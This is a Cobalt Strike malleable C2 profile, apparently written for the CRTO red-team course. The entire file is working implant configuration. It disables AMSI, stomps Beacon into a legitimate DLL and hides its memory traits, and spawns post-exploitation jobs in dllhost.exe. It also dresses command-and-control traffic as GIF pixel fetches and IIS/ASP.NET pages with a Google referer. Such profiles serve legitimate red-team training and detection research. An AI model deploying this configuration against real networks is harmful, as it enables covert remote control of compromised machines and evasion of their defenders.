# Custom C2 Profile for CRTO (Modified by ahrixia)
set sample_name "Dumbledore";
set sleeptime "2000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
set host_stage "true";

stage {
        set userwx "false"; #Allocate Beacon DLL as RW/RX rather than RWX.
        set cleanup "true"; #Free memory associated with reflective loader after it has been loaded
        set obfuscate "true"; # Load Beacon into memory without its DLL headers
        set module_x64 "xpsservices.dll"; #Load DLL from disk, then replace its memory with Beacon.
}

post-ex {
        set amsi_disable "true";
        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";

}

http-get {
        set uri "/cat.gif /image /pixel.gif /logo.gif";

        client {
                # customize client indicators
                header "Accept" "text/html,image/avif,image/webp,*/*";
                header "Accept-Language" "en-US,en;q=0.5";
                header "Accept-Encoding" "gzip, deflate";
                header "Referer" "https://www.google.com";

                parameter "utm" "ISO-8898-1";
                parameter "utc" "en-US";

                metadata{
                        base64;
                        header "Cookie";
                }
        }

        server {
                # customize server indicators
                header "Content-Type" "image/gif";
                header "Server" "Microsoft IIS/10.0";
                header "X-Powered-By" "ASP.NET";

                output{
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
      prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
      prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

http-post {
        set uri "/submit.aspx /finish.aspx";

        client {

                header "Content-Type" "application/octet-stream";
                header "Accept" "text/html,image/avif,image/webp,*/*";
                header "Accept-Language" "en-US,en;q=0.5";
                header "Accept-Encoding" "gzip, deflate";
                header "Referer" "https://www.google.com";

                id{
                        parameter "id";
                }

                output{
                        print;
                }

        }

        server {
                # customize server indicators
                header "Content-Type" "text/plain";
                header "Server" "Microsoft IIS/10.0";
                header "X-Powered-By" "ASP.NET";

                output{
                        netbios;
                        prepend "<!DOCTYPE html><html><head><title></title></head><body><h1>";
                        append "</h1></body></html>";
                        print;
                }
        }
}

http-stager {

        server {
                header "Content-Type" "application/octet-stream";
                header "Server" "Microsoft IIS/10.0";
                header "X-Powered-By" "ASP.NET";
        }
}
